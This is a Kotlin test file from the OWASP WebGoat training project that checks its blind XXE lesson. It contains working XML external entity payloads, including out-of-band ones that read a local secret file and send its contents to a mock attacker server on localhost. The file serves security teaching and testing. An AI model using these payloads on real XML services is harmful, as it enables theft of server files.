/*
 * SPDX-FileCopyrightText: Copyright © 2017 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.lessons.xxe

import com.fasterxml.jackson.databind.ObjectMapper
import com.github.tomakehurst.wiremock.WireMockServer
import com.github.tomakehurst.wiremock.client.WireMock
import com.github.tomakehurst.wiremock.client.WireMock.aResponse
import com.github.tomakehurst.wiremock.client.WireMock.getRequestedFor
import com.github.tomakehurst.wiremock.client.WireMock.urlMatching
import com.github.tomakehurst.wiremock.core.WireMockConfiguration.options
import org.assertj.core.api.Assertions.assertThat
import org.hamcrest.CoreMatchers
import org.hamcrest.Matchers
import org.junit.jupiter.api.BeforeEach
import org.junit.jupiter.api.Test
import org.owasp.webgoat.WithWebGoatUser
import org.owasp.webgoat.container.plugins.LessonTest
import org.springframework.http.MediaType
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get
import org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath
import org.springframework.test.web.servlet.result.MockMvcResultMatchers.status
import org.springframework.test.web.servlet.setup.MockMvcBuilders
import java.io.File

@WithWebGoatUser
class BlindSendFileAssignmentTest : LessonTest() {
    private var port: Int = 0
    private lateinit var webwolfServer: WireMockServer

    @BeforeEach
    fun setup() {
        webwolfServer = WireMockServer(options().dynamicPort())
        webwolfServer.start()
        port = webwolfServer.port()
        mockMvc = MockMvcBuilders.webAppContextSetup(wac).build()
    }

    private fun countComments(): Int {
        val response =
            mockMvc
                .perform(get("/xxe/comments").contentType(MediaType.APPLICATION_JSON))
                .andExpect(status().isOk)
                .andReturn()
        return ObjectMapper().reader().readTree(response.response.contentAsString).size()
    }

    private fun containsComment(expected: String) {
        mockMvc
            .perform(get("/xxe/comments").contentType(MediaType.APPLICATION_JSON))
            .andExpect(status().isOk)
            .andExpect(jsonPath("$.[*].text").value(Matchers.hasItem(expected)))
    }

    @Test
    fun validCommentMustBeAdded() {
        val nrOfComments = countComments()
        mockMvc
            .perform(
                MockMvcRequestBuilders
                    .post("/xxe/blind")
                    .content("<comment><text>test</text></comment>"),
            ).andExpect(status().isOk)
            .andExpect(
                jsonPath("$.feedback", CoreMatchers.`is`(messages.getMessage("assignment.not.solved"))),
            )
        assertThat(countComments()).isEqualTo(nrOfComments + 1)
    }

    @Test
    fun wrongXmlShouldGiveErrorBack() {
        mockMvc
            .perform(
                MockMvcRequestBuilders
                    .post("/xxe/blind")
                    .content("<comment><text>test</ext></comment>"),
            ).andExpect(status().isOk)
            .andExpect(
                jsonPath("$.feedback", CoreMatchers.`is`(messages.getMessage("assignment.not.solved"))),
            ).andExpect(
                jsonPath("$.output", CoreMatchers.startsWith("jakarta.xml.bind.UnmarshalException")),
            )
    }

    @Test
    @WithWebGoatUser
    fun simpleXXEShouldNotWork() {
        val targetFile = File(webGoatHomeDirectory, "/XXE/test/secret.txt")
        val content =
            """<?xml version="1.0" standalone="yes" ?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///%s"> ]><comment><text>&root;</text></comment>"""
        mockMvc
            .perform(
                MockMvcRequestBuilders
                    .post("/xxe/blind")
                    .content(String.format(content, targetFile.toString())),
            ).andExpect(status().isOk)
        containsComment("Nice try, you need to send the file to WebWolf")
    }

    @Test
    fun solve() {
        val targetFile = File(webGoatHomeDirectory, "/XXE/test/secret.txt")
        // Host DTD on WebWolf site
        val dtd =
            """<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "${targetFile.toURI()}">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:$port/landing?text=%file;'>">
%all;"""
        webwolfServer.stubFor(
            WireMock
                .get(WireMock.urlMatching("/files/test.dtd"))
                .willReturn(aResponse().withStatus(200).withBody(dtd)),
        )
        webwolfServer.stubFor(
            WireMock.get(urlMatching("/landing.*")).willReturn(aResponse().withStatus(200)),
        )

        // Make the request from WebGoat
        val xml =
            """<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY % remote SYSTEM "http://localhost:$port/files/test.dtd">%remote;]><comment><text>test&send;</text></comment>"""
        performXXE(xml)
    }

    @Test
    fun solveOnlyParamReferenceEntityInExternalDTD() {
        val targetFile = File(webGoatHomeDirectory, "/XXE/test/secret.txt")
        // Host DTD on WebWolf site
        val dtd =
            """<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:$port/landing?text=%file;'>">
"""
        webwolfServer.stubFor(
            WireMock
                .get(WireMock.urlMatching("/files/test.dtd"))
                .willReturn(aResponse().withStatus(200).withBody(dtd)),
        )
        webwolfServer.stubFor(
            WireMock.get(urlMatching("/landing.*")).willReturn(aResponse().withStatus(200)),
        )

        // Make the request from WebGoat
        val xml =
            """<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY % file SYSTEM "${targetFile.toURI()}">
<!ENTITY % remote SYSTEM "http://localhost:$port/files/test.dtd">%remote;%all;]><comment><text>test&send;</text></comment>"""
        performXXE(xml)
    }

    private fun performXXE(xml: String) {
        // Call with XXE injection
        mockMvc
            .perform(MockMvcRequestBuilders.post("/xxe/blind").content(xml))
            .andExpect(status().isOk)
            .andExpect(
                jsonPath("$.feedback", CoreMatchers.`is`(messages.getMessage("assignment.not.solved"))),
            )

        val requests = webwolfServer.findAll(getRequestedFor(urlMatching("/landing.*")))
        assertThat(requests.size).isEqualTo(1)
        val text = requireNotNull(requests[0].queryParams["text"]).firstValue()

        // Call with retrieved text
        mockMvc
            .perform(
                MockMvcRequestBuilders
                    .post("/xxe/blind")
                    .content("<comment><text>$text</text></comment>"),
            ).andExpect(status().isOk)
            .andExpect(
                jsonPath("$.feedback", CoreMatchers.`is`(messages.getMessage("assignment.solved"))),
            )
    }
}
